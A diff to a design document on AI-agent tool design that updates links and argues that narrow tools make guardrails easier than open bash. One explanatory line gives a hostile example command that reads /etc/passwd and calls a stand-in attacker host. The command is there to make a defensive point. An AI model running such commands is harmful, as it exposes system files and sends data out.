@@ -49,7 +49,7 @@ const grepTool: Tool = {
 
 A specific tool does one thing. The agent can only do what the tool designer anticipated. The capability surface is **closed** — you can enumerate every possible action the tool can take. `file_read` reads one file. `grep` searches for a pattern. No combination of parameters makes them do anything else.
 
-**Properties**: predictable behavior, easy to [guardrail](guardrail.md), inspectable by humans, testable with conventional techniques.
+**Properties**: predictable behavior, easy to [guardrail](../harness/guardrail.md), inspectable by humans, testable with conventional techniques.
 
 ### Parameterized Tools — Open Queries Within a Bounded Domain
 
@@ -204,11 +204,11 @@ If bash subsumes all specific tools, why does every agent system ship with both 
 
 Three reasons:
 
-**1. Narrowing the action space for safety.** `file_read(path)` can only read one file. The equivalent `bash("cat " + path)` could be `bash("cat /etc/passwd && curl evil.com")`. Specific tools are pre-constrained action spaces that make [guardrailing](guardrail.md) tractable. They remove degrees of freedom that the agent doesn't need for the task.
+**1. Narrowing the action space for safety.** `file_read(path)` can only read one file. The equivalent `bash("cat " + path)` could be `bash("cat /etc/passwd && curl evil.com")`. Specific tools are pre-constrained action spaces that make [guardrailing](../harness/guardrail.md) tractable. They remove degrees of freedom that the agent doesn't need for the task.
 
 **2. Cognitive affinity.** Specific tools with clear schemas are easier for the LLM to use correctly. `file_read` has one parameter (path) with clear semantics. Bash requires the LLM to generate syntactically correct shell commands, handle quoting, deal with pipes, and manage error codes. Specific tools compress the decision space — the LLM makes fewer choices, each choice is less error-prone.
 
-**3. Observability.** A trace that shows `file_read("/src/auth.ts")` is immediately understandable. A trace that shows `bash("cat src/auth.ts | head -50")` requires parsing a shell command to understand what happened. Specific tools produce structured, inspectable traces that make [verification](../verification.md) easier.
+**3. Observability.** A [trace](../verification/trace.md) that shows `file_read("/src/auth.ts")` is immediately understandable. A trace that shows `bash("cat src/auth.ts | head -50")` requires parsing a shell command to understand what happened. Specific tools produce structured, inspectable traces that make [verification](../verification/index.md) easier.
 
 The design principle: **use the least expressive tool that accomplishes the task.** Offer specific tools for common operations (file I/O, search, web fetch). Reserve generative tools for situations where no specific tool exists or where the task genuinely requires composing novel programs.
 
@@ -216,7 +216,7 @@ The design principle: **use the least expressive tool that accomplishes the task
 
 ## Guardrailing Across the Spectrum
 
-[Guardrails](guardrail.md) intercept tool calls and enforce constraints. How complete that enforcement is depends on where the tool sits on the expressiveness spectrum.
+[Guardrails](../harness/guardrail.md) intercept tool calls and enforce constraints. How complete that enforcement is depends on where the tool sits on the expressiveness spectrum.
 
 Over specific tools, the set of dangerous actions is **enumerable**:
 
@@ -264,7 +264,7 @@ This is how guardrails and environments compose: guardrails enforce constraints 
 
 ## Generative Tools as the Interface to the Environment
 
-Generative tools are the mechanism through which the agent accesses and modifies its [Environment](../patterns/deployment.md).
+Generative tools are the mechanism through which the agent accesses and modifies its [Environment](../environment/environment.md).
 
 With specific tools, the Environment is a passive, deployment-time configuration — the agent gets `file_read` configured to access a specific directory, and that's all it can reach. With bash, the Environment becomes something the agent **actively reaches and modifies through a tool**:
 
@@ -305,30 +305,28 @@ MCP tools are the safe version of bash's openness — they provide the extensibi
 
 ## Tools as the Architectural Boundary
 
-Tools define the boundary between agent primitives and regular software. The `execute(params) → result` interface is the seam:
+Tools define the boundary between the agent system and regular software. The `execute(params) → result` interface is the seam:
 
 ```
-Agent primitives:   LLM + Tools + Memory + Guardrails + StateMachine + Channel
+Agent system:       LLM + Tool (primitives) + patterns built over them
                            ↓
 Tool boundary:      execute(params) → result
                            ↓
 Everything below:   Regular software (databases, pipelines, APIs, infrastructure)
 ```
 
-- **Above the boundary**: agent primitives — LLM, Memory, Guardrails, Channels, orchestration. This is where non-deterministic reasoning happens.
+- **Above the boundary**: the agent system — LLM reasoning plus the harness that structures it (AgentLoop, Session, Guardrail, Agent) and the patterns composed on top (Memory, Channel, orchestration). This is where non-deterministic reasoning happens.
 - **Below the boundary**: regular software engineering — databases, APIs, pipelines, infrastructure. This is deterministic, well-understood, and testable with conventional techniques.
 
 The agent doesn't know or care what lives behind the tool interface. A `query_portfolio` tool might execute a simple SQL query or trigger a multi-stage ETL pipeline — the agent sees the same `(params) → result` signature either way. This separation is what makes agent systems composable: you can swap the implementation behind any tool without changing the agent.
-
-This boundary is central to [App Inversion](../app-inversion/architecture.md) — the thesis that applications decompose into tool-shaped capabilities consumed by agents.
 
 ---
 
 ## Related
 
 - [LLM](llm.md) — the other atomic primitive; LLM reasons, Tool acts
-- [AgentLoop](../patterns/agent-loop.md) — the recursive cycle that connects LLM decisions to Tool execution
-- [Guardrail](guardrail.md) — constraints that wrap tool execution; hard for specific tools, best-effort for generative tools
+- [AgentLoop](../harness/agent-loop.md) — the recursive cycle that connects LLM decisions to Tool execution
+- [Guardrail](../harness/guardrail.md) — constraints that wrap tool execution; hard for specific tools, best-effort for generative tools
 - [Workspace](../patterns/workspace.md) — the structured data space accessed through tools; filesystem tools have maximum cognitive affinity
-- [Deployment](../patterns/deployment.md) — Environment defines what generative tools can reach
-- [App Inversion](../app-inversion/architecture.md) — how the tool boundary reshapes software architecture
+- [Environment](../environment/environment.md) — the substrate generative tools reach into; the capability boundary for open-action-space tools
+- [Agent](../harness/agent.md) — wires a Session to a specific Environment behind a Frontend
